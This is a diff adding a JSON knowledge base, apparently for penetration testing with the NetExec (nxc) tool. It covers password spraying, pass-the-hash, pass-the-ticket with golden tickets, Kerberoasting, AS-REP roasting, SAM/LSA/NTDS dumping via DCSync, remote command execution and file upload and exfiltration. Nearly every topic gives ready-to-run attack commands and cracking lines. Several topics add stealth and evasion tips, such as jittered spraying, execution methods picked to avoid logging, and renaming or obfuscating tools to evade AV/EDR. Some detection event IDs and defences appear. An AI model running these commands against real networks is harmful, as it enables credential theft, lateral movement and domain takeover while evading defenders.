@@ -1,0 +1,285 @@
+{
+  "knowledge_base_part": 2,
+  "categories": [
+    {
+      "id": "credential_attacks",
+      "name": "Credential Attacks",
+      "topics": [
+        {
+          "title": "Password Spraying",
+          "keywords": ["password spray", "spray", "--continue-on-success", "lockout", "account lockout", "spray timing", "password list", "user list", "brute force", "--no-bruteforce", "--jitter", "STATUS_LOGON_FAILURE", "STATUS_ACCOUNT_LOCKED_OUT"],
+          "difficulty": "intermediate",
+          "content": "Password spraying is the technique of trying a single password against many user accounts simultaneously, minimizing the risk of account lockouts compared to brute-force attacks. NXC supports spraying via 'nxc smb <dc_ip> -u users.txt -p Password123'. By default, NXC stops after the first successful authentication. The --continue-on-success flag is critical — it makes NXC continue testing all users even after finding valid credentials. Without this flag, you will miss other valid accounts. The --no-bruteforce flag changes the behavior to pair each username with its corresponding password line-by-line (user1:pass1, user2:pass2) rather than trying all combinations. CRITICAL: Always retrieve the password policy (--pass-pol) before spraying. Safe spraying formula: try at most (lockout_threshold - 2) passwords per reset_counter period. For example, if lockout threshold is 5 and reset counter is 30 minutes, try 3 passwords maximum, then wait 35+ minutes before the next round. Common effective passwords: Season+Year (Summer2024!), CompanyName+123, Month+Year, Password+Number, Welcome+Number. Spray against the DC (not individual hosts) since all domain auth goes through the DC anyway — this reduces event volume. Reduce threads with -t 1 for stealth. The --jitter flag adds a random delay between attempts.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --continue-on-success",
+              "explanation": "Spray the password 'Summer2024!' against all users in the file, continuing past the first success to find all valid accounts",
+              "use_case": "Standard password spraying campaign during internal penetration test"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success",
+              "explanation": "Test credential pairs line-by-line (user1:pass1, user2:pass2) instead of all combinations",
+              "use_case": "Testing known credential pairs from a breach database or phishing campaign"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --continue-on-success -t 1 --jitter 3",
+              "explanation": "Spray with single thread and 3-second jitter between attempts for maximum stealth",
+              "use_case": "OPSEC-conscious spraying in monitored environments"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --pass-pol",
+              "explanation": "Retrieve the domain password policy before spraying — shows lockout threshold and reset counter",
+              "use_case": "MANDATORY pre-spray check to determine safe spray parameters"
+            }
+          ],
+          "warnings": ["ALWAYS check password policy before spraying", "Never exceed (lockout_threshold - 2) attempts per reset period", "STATUS_ACCOUNT_LOCKED_OUT means stop immediately", "Spray against DC, not individual hosts, to reduce noise"],
+          "best_practices": ["Check password policy first with --pass-pol", "Use --continue-on-success to find all valid accounts", "Spray against DC only to minimize events", "Wait 5 minutes longer than the reset counter between rounds"],
+          "related_cves": [],
+          "related_topics": ["Password Policy Enumeration", "Credential Validation", "Account Lockout"]
+        },
+        {
+          "title": "Credential Validation Across Multiple Hosts",
+          "keywords": ["credential check", "admin check", "Pwn3d!", "credential reuse", "password reuse", "local admin reuse", "check admin access"],
+          "difficulty": "beginner",
+          "content": "Once valid credentials are obtained (through spraying, cracking, phishing, or any other method), the next step is checking where those credentials grant access across the network. Running 'nxc smb <subnet> -u user -p pass' authenticates to every host and shows [+] for success and (Pwn3d!) for admin access. This is one of the most powerful NXC capabilities — instantly mapping where a single set of credentials can be used for lateral movement. For local admin password reuse testing, use --local-auth to check if a local admin password is shared across multiple workstations. Common findings include: service accounts with local admin on multiple servers, the same local admin password across all workstations (pre-LAPS environments), domain admin credentials with Pwn3d! on every host. Check multiple protocols (SMB, WinRM, RDP, MSSQL) to find all access paths. The nxcdb database automatically stores all successful authentications, making it easy to query which credentials work where.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.0/24 -u svc_sql -p 'Summer2024!'",
+              "explanation": "Check where the svc_sql account can authenticate and has admin access (Pwn3d!) across the entire subnet",
+              "use_case": "Mapping the access footprint of a compromised service account"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 -u administrator -p 'LocalAdmin!' --local-auth",
+              "explanation": "Check if the local administrator password 'LocalAdmin!' is reused across workstations",
+              "use_case": "Testing for local admin password reuse — a critical finding in pre-LAPS environments"
+            },
+            {
+              "command": "nxc winrm 192.168.1.0/24 -u admin.jones -p 'Password123'",
+              "explanation": "Check WinRM access across the subnet — Pwn3d! means PowerShell Remoting is available",
+              "use_case": "Finding alternative command execution paths via WinRM when SMB is restricted"
+            }
+          ],
+          "warnings": ["Checking all hosts generates one logon event per host", "Use specific targets instead of full subnets for stealth"],
+          "best_practices": ["Check multiple protocols (SMB, WinRM, RDP, MSSQL) for all access paths", "Use --local-auth for SAM-derived credentials", "Look for (Pwn3d!) to identify hosts for credential dumping"],
+          "related_cves": [],
+          "related_topics": ["Pass-the-Hash", "Lateral Movement", "Local Admin Password Reuse"]
+        },
+        {
+          "title": "Pass-the-Hash (PTH)",
+          "keywords": ["pass-the-hash", "PTH", "pth", "-H", "NTLM hash", "NT hash", "LM hash", "hash authentication", "aad3b435b51404eeaad3b435b51404ee", "hash format", "hash spray"],
+          "difficulty": "intermediate",
+          "content": "Pass-the-Hash (PTH) allows authentication using NTLM hashes without knowing the plaintext password. This is one of the most critical lateral movement techniques because NTLM hashes are available from SAM dumps, LSASS dumps, and NTDS dumps. NXC accepts hashes via -H in two formats: the full LM:NT format ('aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99') or just the NT hash ('5f4dcc3b5aa765d61d8327deb882cf99'). The LM hash portion is almost always 'aad3b435b51404eeaad3b435b51404ee' (empty LM hash) on modern systems since LM hashing is disabled by default. PTH works because NTLM authentication uses the NT hash directly — the DC/host never sees the plaintext password. PTH requirements: the target must accept NTLM authentication (not Kerberos-only), and for administrative operations the account must be local admin on the target. For the built-in Administrator (RID 500), PTH always works for admin operations even with UAC remote restrictions. For other local admin accounts, the registry key LocalAccountTokenFilterPolicy must be set to 1. PTH works regardless of SMB signing — signing prevents relay attacks, not direct hash authentication. Hashes can be sprayed across subnets just like passwords: 'nxc smb 192.168.1.0/24 -u administrator -H hash --local-auth'.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99'",
+              "explanation": "Pass-the-hash across the subnet using the full LM:NT hash format to check where the domain administrator has admin access",
+              "use_case": "Lateral movement using a hash obtained from NTDS dump or LSASS"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' --local-auth",
+              "explanation": "PTH with just the NT hash portion using local authentication to check for local admin hash reuse",
+              "use_case": "Checking if a local admin hash from one SAM dump works on other workstations"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' -x 'whoami'",
+              "explanation": "Pass-the-hash and execute a command on the target",
+              "use_case": "Executing commands on a host using a stolen NTLM hash"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' --sam",
+              "explanation": "Pass-the-hash and dump the local SAM database for more hashes",
+              "use_case": "Credential chaining — using one hash to extract more hashes from other hosts"
+            }
+          ],
+          "warnings": ["Non-RID-500 local admins may fail due to UAC remote restrictions", "PTH generates Event ID 4624 Type 3 and 4776 on the DC", "Credential Guard prevents hash extraction from LSASS but doesn't block PTH with externally obtained hashes"],
+          "best_practices": ["Use RID 500 (built-in Administrator) for most reliable PTH", "Combine with --local-auth for SAM-derived hashes", "Always try PTH against the DC with Domain Admin hashes for DCSync"],
+          "related_cves": [],
+          "related_topics": ["SAM Dump", "LSASS Dump", "NTDS Dump", "Credential Chaining"]
+        },
+        {
+          "title": "Pass-the-Ticket (PTT) with Kerberos",
+          "keywords": ["pass-the-ticket", "PTT", "kerberos", "-k", "--use-kcache", "KRB5CCNAME", ".ccache", "TGT", "ticket", "golden ticket", "silver ticket"],
+          "difficulty": "advanced",
+          "content": "Pass-the-Ticket (PTT) uses Kerberos tickets (.ccache files) for authentication instead of passwords or NTLM hashes. This technique is stealthier than PTH because it uses legitimate Kerberos authentication, avoiding NTLM-specific detections (Event ID 4776 on the DC). To use PTT with NXC: 1) Set the KRB5CCNAME environment variable to point to the .ccache ticket file, 2) Use -k to enable Kerberos authentication and --use-kcache to use the cached ticket. CRITICAL: targets must be specified by hostname (not IP) because Kerberos requires hostname resolution. The .ccache file can contain a TGT (Ticket Granting Ticket) or a service-specific TGS. TGTs can be obtained through: impacket's getTGT.py, Rubeus on Windows, or extracted from memory. Golden tickets (forged TGTs using the krbtgt hash) and silver tickets (forged TGS for specific services) can also be used with PTT. Requirements: /etc/krb5.conf must be configured or DNS must resolve the domain, the ticket must be valid and not expired, and clock skew must be less than 5 minutes between the attacker and the DC. Kerberos PTT generates Event IDs 4768 (TGT request) and 4769 (TGS request) instead of NTLM events.",
+          "examples": [
+            {
+              "command": "export KRB5CCNAME=/tmp/administrator.ccache && nxc smb dc01.corp.local -k --use-kcache",
+              "explanation": "Set the Kerberos ticket cache and authenticate to the DC using the cached administrator TGT",
+              "use_case": "Using a stolen or forged Kerberos ticket for stealthy authentication"
+            },
+            {
+              "command": "export KRB5CCNAME=/tmp/administrator.ccache && nxc smb dc01.corp.local -k --use-kcache --ntds",
+              "explanation": "DCSync the entire NTDS database using a Kerberos ticket for authentication",
+              "use_case": "Stealthy domain credential extraction using PTT instead of NTLM"
+            },
+            {
+              "command": "export KRB5CCNAME=/tmp/golden.ccache && nxc smb dc01.corp.local -k --use-kcache -x 'whoami'",
+              "explanation": "Execute commands using a golden ticket (forged TGT created with krbtgt hash)",
+              "use_case": "Persistent access using a golden ticket after obtaining the krbtgt hash"
+            },
+            {
+              "command": "nxc smb dc01.corp.local -u admin -p Password123 -k",
+              "explanation": "Authenticate using Kerberos (obtain TGT with the provided credentials) instead of NTLM",
+              "use_case": "Switching to Kerberos authentication to avoid NTLM-specific detections"
+            }
+          ],
+          "warnings": ["Target MUST be hostname not IP for Kerberos", "Clock skew > 5 minutes will cause Kerberos to fail", "/etc/krb5.conf must be configured correctly", "Expired tickets will fail — check ticket lifetime"],
+          "best_practices": ["Use PTT for stealth — avoids NTLM Event 4776 on DC", "Ensure DNS resolution works before attempting Kerberos", "Sync time with DC: ntpdate dc01.corp.local"],
+          "related_cves": [],
+          "related_topics": ["Pass-the-Hash", "Golden Ticket", "Silver Ticket", "Kerberos Authentication"]
+        },
+        {
+          "title": "Kerberoasting via NXC",
+          "keywords": ["kerberoasting", "--kerberoasting", "SPN", "service principal name", "TGS", "service ticket", "$krb5tgs$", "hashcat 13100", "GetUserSPNs", "service account", "MSSQLSvc", "HTTP"],
+          "difficulty": "intermediate",
+          "content": "Kerberoasting extracts Kerberos service ticket hashes (TGS) for accounts with Service Principal Names (SPNs), which can then be cracked offline to reveal service account passwords. Any domain user can request service tickets — no special privileges are needed. NXC performs Kerberoasting via the LDAP module: 'nxc ldap <dc> -u user -p pass --kerberoasting output.txt'. The output lists discovered SPNs (e.g., svc_sql - MSSQLSvc/sql01.corp.local:1433) and writes hashcat/john-compatible hashes to the output file in the format $krb5tgs$23$*username$DOMAIN$SPN*$hash. Crack with hashcat mode 13100: 'hashcat -m 13100 output.txt rockyou.txt'. Service accounts are high-value targets because they often have: weak passwords (set once and never changed), elevated privileges (local admin on multiple servers), and SPNs that make them Kerberoastable. Common Kerberoastable SPNs include MSSQLSvc (SQL Server), HTTP (web services), cifs (file sharing), and custom SPNs. Defense: use long, random passwords (25+ characters) for service accounts, use Group Managed Service Accounts (gMSA) where possible, and monitor for Event ID 4769 with RC4 encryption (0x17) as a Kerberoasting indicator.",
+          "examples": [
+            {
+              "command": "nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --kerberoasting /tmp/kerberoast.txt",
+              "explanation": "Request service tickets for all accounts with SPNs in the domain and save the hashes for offline cracking",
+              "use_case": "Standard Kerberoasting attack to find crackable service account passwords"
+            },
+            {
+              "command": "hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --rules /usr/share/hashcat/rules/best64.rule",
+              "explanation": "Crack the extracted Kerberos TGS hashes offline using hashcat with rules",
+              "use_case": "Offline password cracking after Kerberoasting"
+            }
+          ],
+          "warnings": ["Kerberoasting generates Event ID 4769 for each SPN requested", "RC4 encryption (0x17) in TGS requests is a strong detection indicator", "Defenders monitoring for bulk TGS requests will detect this"],
+          "best_practices": ["Any domain user can Kerberoast — it's often the first escalation step", "Focus cracking efforts on service accounts that are likely admin somewhere", "Use rules and large wordlists — service account passwords may be complex but not necessarily long"],
+          "related_cves": [],
+          "related_topics": ["AS-REP Roasting", "Service Accounts", "Hashcat Cracking"]
+        },
+        {
+          "title": "AS-REP Roasting via NXC",
+          "keywords": ["asreproast", "--asreproast", "AS-REP", "pre-authentication", "UF_DONT_REQUIRE_PREAUTH", "DONT_REQ_PREAUTH", "$krb5asrep$", "hashcat 18200", "no preauth"],
+          "difficulty": "intermediate",
+          "content": "AS-REP Roasting targets accounts that have Kerberos pre-authentication disabled (the DONT_REQ_PREAUTH user account control flag). When pre-authentication is disabled, anyone can request an AS-REP (Authentication Service Reply) for that account without providing a password, and the response contains an encrypted portion that can be cracked offline. NXC performs AS-REP roasting via the LDAP module: 'nxc ldap <dc> -u user -p pass --asreproast output.txt'. The output identifies accounts with UF_DONT_REQUIRE_PREAUTH set and writes hashes in the format $krb5asrep$23$username@DOMAIN:hash. Crack with hashcat mode 18200: 'hashcat -m 18200 output.txt rockyou.txt'. Unlike Kerberoasting, AS-REP roasting can be performed without valid domain credentials — you only need a list of usernames. Use 'nxc ldap <dc> -u users.txt -p '' --asreproast output.txt' to check a username list without passwords. Accounts with pre-auth disabled are relatively rare in well-managed environments but are common in legacy configurations and environments with older applications that don't support pre-authentication. AS-REP hashes use encryption type 23 (RC4) by default and are faster to crack than Kerberoast hashes.",
+          "examples": [
+            {
+              "command": "nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --asreproast /tmp/asrep.txt",
+              "explanation": "Find all accounts with pre-authentication disabled and extract their AS-REP hashes for offline cracking",
+              "use_case": "Standard AS-REP roasting with valid domain credentials"
+            },
+            {
+              "command": "nxc ldap 192.168.1.10 -u users.txt -p '' --asreproast /tmp/asrep.txt",
+              "explanation": "Attempt AS-REP roasting without valid credentials, using a list of potential usernames",
+              "use_case": "AS-REP roasting when you have no valid password — only a username list"
+            },
+            {
+              "command": "hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt",
+              "explanation": "Crack AS-REP hashes offline using hashcat",
+              "use_case": "Offline cracking of AS-REP roasted hashes"
+            }
+          ],
+          "warnings": ["Accounts with pre-auth disabled are a significant security risk — always report this finding", "AS-REP roasting without credentials may not work on all DC configurations"],
+          "best_practices": ["Try AS-REP roasting early — it may not require valid credentials", "AS-REP hashes are faster to crack than Kerberoast hashes", "Always report DONT_REQ_PREAUTH as a finding even if the hash doesn't crack"],
+          "related_cves": [],
+          "related_topics": ["Kerberoasting", "Kerberos Authentication", "Credential Cracking"]
+        },
+        {
+          "title": "Secretsdump: SAM, LSA, and NTDS",
+          "keywords": ["--sam", "--lsa", "--ntds", "secretsdump", "SAM dump", "LSA secrets", "NTDS dump", "DCSync", "hash dump", "credential dump", "ntds-pwdLastSet", "ntds-history", "DCC2", "cached credentials", "MS-DRSR", "replication"],
+          "difficulty": "advanced",
+          "content": "NXC can extract credentials from three sources: the SAM database, LSA secrets, and the NTDS.dit Active Directory database. SAM dump (--sam) extracts local user account hashes from the Security Accounts Manager registry hive. Output format: username:RID:LM_hash:NT_hash:::. Requires local admin on the target. Use these hashes for PTH against other hosts to test local admin password reuse. LSA secrets dump (--lsa) extracts cached domain credentials (DCC2 format), service account passwords, machine account hashes, and DPAPI keys. DCC2 hashes are much slower to crack (hashcat mode 2100). NTDS dump (--ntds) performs a DCSync attack, extracting the entire Active Directory database including all user hashes. This uses the MS-DRSR (Directory Replication Service Remote) protocol to impersonate a domain controller requesting replication data. Requirements: Domain Admin, Enterprise Admin, or specific 'Replicating Directory Changes' and 'Replicating Directory Changes All' permissions. Output format: DOMAIN\\username:RID:LM:NT:::. Optional flags: --ntds-pwdLastSet adds the password last set date to each entry, --ntds-history dumps previous password hashes for password reuse analysis. DCSync is detectable via Event ID 4662 with specific replication GUIDs from a non-DC source IP. DCSync does not require code execution on the DC — it works purely over the network via RPC.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' --sam",
+              "explanation": "Dump local user account hashes from the SAM database on WS01 — requires local admin (Pwn3d!)",
+              "use_case": "Extracting local admin hashes for PTH against other workstations"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' --lsa",
+              "explanation": "Dump LSA secrets including cached domain credentials, service account passwords, and machine keys",
+              "use_case": "Finding cached domain credentials and service account passwords on compromised hosts"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u administrator -p 'Password123' --ntds",
+              "explanation": "DCSync the entire Active Directory database — extracts all user hashes from the domain controller",
+              "use_case": "Full domain credential extraction after achieving Domain Admin access"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' --ntds --ntds-pwdLastSet",
+              "explanation": "DCSync using a hash with password last set dates — identifies stale passwords",
+              "use_case": "Password audit — identifying accounts with old passwords that may be weak"
+            }
+          ],
+          "warnings": ["DCSync requires Domain Admin or equivalent", "DCSync is detectable via Event ID 4662", "NTDS dump may take significant time on large domains", "--sam and --lsa require local admin on the target"],
+          "best_practices": ["Dump SAM first to check for local admin password reuse", "Use LSA to find cached domain credentials on compromised hosts", "DCSync is the endgame — extract everything once you have DA"],
+          "related_cves": [],
+          "related_topics": ["DCSync Detection", "Pass-the-Hash", "Credential Chaining", "LSASS Dump"]
+        }
+      ]
+    },
+    {
+      "id": "lateral_movement",
+      "name": "Lateral Movement",
+      "topics": [
+        {
+          "title": "Command Execution Methods",
+          "keywords": ["--exec-method", "wmiexec", "smbexec", "atexec", "mmcexec", "execution method", "-x", "-X", "cmd.exe", "powershell", "command execution", "remote execution"],
+          "difficulty": "intermediate",
+          "content": "NXC supports four methods for executing commands on remote hosts, each with different OPSEC characteristics. wmiexec (default) uses WMI/DCOM — no service created, output via temp file on ADMIN$, requires DCOM (port 135 + high ports), generates WMI-Activity events. smbexec creates a temporary Windows service — very noisy (Event ID 7045 for service creation), only requires SMB (port 445), leaves clear artifacts in System event log. atexec uses the Task Scheduler — creates/deletes a scheduled task (Event IDs 4698/4699), moderate detection risk, blends with legitimate scheduled tasks. mmcexec uses MMC DCOM objects — no service created, requires DCOM, less commonly monitored than WMI. Specify the method with --exec-method: 'nxc smb target -u admin -p pass -x whoami --exec-method atexec'. Use -x for cmd.exe commands and -X for PowerShell commands. All methods require local admin access (Pwn3d!). Commands can be executed across entire subnets: 'nxc smb 192.168.1.0/24 -u admin -p pass -x hostname'. For OPSEC: prefer wmiexec (no service), avoid smbexec (service creation is the strongest detection signal). For compatibility: use smbexec when DCOM is blocked, use atexec as a middle ground.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'whoami'",
+              "explanation": "Execute 'whoami' via cmd.exe using the default wmiexec method — no service created",
+              "use_case": "Basic command execution on a host where you have admin access"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -X 'Get-Process'",
+              "explanation": "Execute a PowerShell command via the default wmiexec method",
+              "use_case": "Running PowerShell commands remotely for enumeration or exploitation"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'whoami' --exec-method smbexec",
+              "explanation": "Execute via smbexec — creates a temporary service. Use when DCOM is blocked.",
+              "use_case": "Fallback execution when WMI/DCOM is not available"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'whoami' --exec-method atexec",
+              "explanation": "Execute via Task Scheduler — creates a scheduled task briefly",
+              "use_case": "Alternative execution method that blends with legitimate scheduled tasks"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 -u administrator -p 'Password123' -x 'hostname' -t 5",
+              "explanation": "Execute hostname across the subnet with 5 threads to identify all admin-accessible hosts",
+              "use_case": "Mass command execution for network situational awareness"
+            }
+          ],
+          "warnings": ["smbexec creates a service — highly detectable (Event ID 7045)", "All execution methods require local admin access (Pwn3d!)", "PowerShell (-X) may be blocked by AppLocker/WDAC or constrained language mode"],
+          "best_practices": ["Use wmiexec (default) for best OPSEC", "Use smbexec only when DCOM is blocked", "Use -x (cmd.exe) instead of -X (PowerShell) to avoid PowerShell logging", "Limit threads (-t) for stealth when executing across subnets"],
+          "related_cves": [],
+          "related_topics": ["OPSEC and Detection", "WinRM Execution", "File Transfer"]
+        },
+        {
+          "title": "File Transfer Operations",
+          "keywords": ["--put-file", "--get-file", "file upload", "file download", "file transfer", "upload payload", "download file", "exfiltration"],
+          "difficulty": "intermediate",
+          "content": "NXC supports file upload and download via SMB shares. The --put-file flag uploads a local file to the target: 'nxc smb target -u admin -p pass --put-file /local/path/file.exe C:\\remote\\path\\file.exe'. The --get-file flag downloads a file from the target: 'nxc smb target -u admin -p pass --get-file C:\\remote\\path\\file.txt /local/path/file.txt'. Both operations require appropriate permissions — typically local admin for writing to system directories. Common use cases: uploading tools (SharpHound, Rubeus, ProcDump) for execution, downloading sensitive files (web.config, KeePass databases, registry hives), and exfiltrating data. File transfers use SMB (CIFS) protocol and generate Event ID 5145 for share access. Always clean up uploaded files after use to reduce artifacts. For operational security, avoid uploading well-known offensive tools to disk — they may be caught by AV/EDR file scanning. Instead, prefer in-memory execution when possible or use renamed/obfuscated binaries.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' --put-file /tmp/SharpHound.exe 'C:\\Windows\\Temp\\sh.exe'",
+              "explanation": "Upload SharpHound to the target's temp directory for execution",
+              "use_case": "Staging tools on a compromised host for further enumeration"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' --get-file 'C:\\inetpub\\wwwroot\\web.config' /tmp/web.config",
+              "explanation": "Download a web.config file that may contain database connection strings and credentials",
+              "use_case": "Extracting configuration files with potential credentials"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'del C:\\Windows\\Temp\\sh.exe'",
+              "explanation": "Clean up an uploaded file after execution to reduce forensic artifacts",
+              "use_case": "Post-operation cleanup to maintain OPSEC"
+            }
+          ],
+          "warnings": ["Uploaded files may be detected by AV/EDR", "File transfers generate SMB share access events (5145)", "Always clean up uploaded tools after use"],
+          "best_practices": ["Upload to C:\\Windows\\Temp for common write access", "Clean up files after use", "Avoid uploading well-known offensive tools — rename or obfuscate"],
+          "related_cves": [],
+          "related_topics": ["Command Execution", "Share Access", "OPSEC"]
+        }
+      ]
+    }
+  ]
+}
